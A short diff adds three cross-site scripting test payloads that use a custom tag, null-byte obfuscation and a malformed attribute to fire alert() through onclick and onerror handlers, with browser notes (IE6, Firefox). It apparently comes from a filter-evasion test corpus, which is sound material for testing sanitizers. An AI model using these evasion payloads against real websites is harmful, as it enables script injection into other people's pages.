@@ -1,0 +1,5 @@
+<L:%B5 onclick=alert(1) >click  me </L:%B5>
+
+<im%00g sr%00c=x onerror=ale%00rt(2) >(Only IE6)
+
+<img src="foobar onerror=alert(3)  // (All firefox)
